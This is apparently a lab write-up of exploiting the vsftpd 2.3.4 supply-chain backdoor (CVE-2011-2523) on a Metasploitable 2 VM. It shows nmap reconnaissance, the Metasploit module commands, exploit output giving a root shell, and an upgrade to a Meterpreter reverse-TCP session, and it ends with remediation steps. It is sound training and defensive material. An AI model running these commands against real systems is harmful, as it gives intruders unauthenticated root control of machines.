# VSFTPD 2.3.4 Backdoor Command Execution

## Vulnerability Overview

| Field            | Details                                      |
|-----------------|----------------------------------------------|
| **CVE**         | CVE-2011-2523                                |
| **Service**     | FTP (vsftpd 2.3.4)                           |
| **Port**        | 21/tcp                                       |
| **Severity**    | 🔴 Critical                                  |
| **CVSS Score**  | 10.0                                         |
| **Disclosed**   | July 3, 2011                                 |
| **MSF Module**  | `exploit/unix/ftp/vsftpd_234_backdoor`       |
| **Rank**        | Excellent                                    |

---

## Description

A malicious backdoor was secretly introduced into the **vsftpd 2.3.4** source archive (`vsftpd-2.3.4.tar.gz`) between June 30 and July 1, 2011. When a user attempts to log in with a username containing the string `:)` (a smiley face), the backdoor triggers and opens a **root shell** on **TCP port 6200** of the target machine — granting the attacker full, unauthenticated root access.

This is a supply-chain compromise: the backdoor was injected into the official download, not into the software itself.

---

## Environment

| Role      | OS              | IP Address        |
|-----------|-----------------|-------------------|
| Attacker  | Kali Linux      | 192.168.133.129   |
| Target    | Metasploitable 2| 192.168.133.128   |

---

## Step 1 — Reconnaissance (Nmap Scan)

An Nmap service version scan was run against the target to enumerate open ports and running services.

```bash
nmap -sV 192.168.133.128
```

**Key findings from the scan output:**

```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

The scan revealed **vsftpd 2.3.4** running on port 21 — a version known to contain a backdoor.

> 📸 *Screenshot: `screenshots/nmap_scan.png`*

---

## Step 2 — Searching for the Exploit (Metasploit)

Metasploit Framework was launched and searched for the vsftpd backdoor module.

```bash
msfconsole
msf > search vsftpd_234_backdoor
```

**Result:**

```
#  Name                            Disclosure Date  Rank       Description
-  ----                            ---------------  ----       -----------
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

The module was loaded:

```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > options
```

> 📸 *Screenshot: `screenshots/msf_search_options.png`*

---

## Step 3 — Configuring and Running the Exploit

The target IP was set as `RHOSTS` and the exploit was executed.

```bash
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.133.128
RHOSTS => 192.168.133.128

msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

**Exploit output:**

```
[*] 192.168.133.128:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.133.128:21 - USER: 331 Please specify the password.
[+] 192.168.133.128:21 - Backdoor service has been spawned, handling...
[+] 192.168.133.128:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.133.129:46459 → 192.168.133.128:6200)
```

✅ **Root shell obtained.** UID confirmed as `uid=0(root) gid=0(root)`.

> 📸 *Screenshot: `screenshots/exploit_shell.png`*

---

## Step 4 — Post-Exploitation (Shell Enumeration)

Basic post-exploitation commands were run inside the shell session:

```bash
whoami
# root

ifconfig
# eth0: inet addr: 192.168.133.128
```

The attacker confirmed full root-level access on the target machine.

---

## Step 5 — Upgrading to Meterpreter Session

The basic command shell (Session 1) was upgraded to a full **Meterpreter** session for advanced post-exploitation capabilities.

```bash
# Background the current session
^Z
Background session 1? [Y/N] y

# Upgrade shell to meterpreter
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
```

**Upgrade output:**

```
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.133.129:4433
[*] Sending stage (1062760 bytes) to 192.168.133.128
[*] Meterpreter session 2 opened (192.168.133.129:4433 → 192.168.133.128:49628)
[*] Command stager progress: 100.00% (773/773 bytes)
```

**Active sessions after upgrade:**

```
Id  Type                 Information                        Connection
--  ----                 -----------                        ----------
1   shell cmd/unix                                          192.168.133.129:46459 → 192.168.133.128:6200
2   meterpreter x86/linux  root @ metasploitable.localdomain  192.168.133.129:4433 → 192.168.133.128:49628
```

✅ **Meterpreter session (Session 2) successfully established as root.**

> 📸 *Screenshot: `screenshots/meterpreter_session.png`*

---

## Impact

- Full **unauthenticated root access** to the target system
- Complete control over the filesystem, processes, and network
- Ability to install persistent backdoors, exfiltrate data, pivot to internal network
- No credentials or interaction from the victim required

---

## Remediation

| Action | Details |
|--------|---------|
| **Upgrade vsftpd** | Update to vsftpd 3.x or a patched version immediately |
| **Verify checksums** | Always verify SHA256/MD5 of downloaded software against official checksums |
| **Firewall FTP** | Block port 21 externally; use SFTP (port 22) instead |
| **Disable FTP** | If FTP is not required, disable the service entirely |
| **Monitor port 6200** | Alert on any connections to TCP 6200 (backdoor trigger port) |

---

## References

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Rapid7 Module — VSFTPD 2.3.4 Backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [Exploit-DB #17491](https://www.exploit-db.com/exploits/17491)
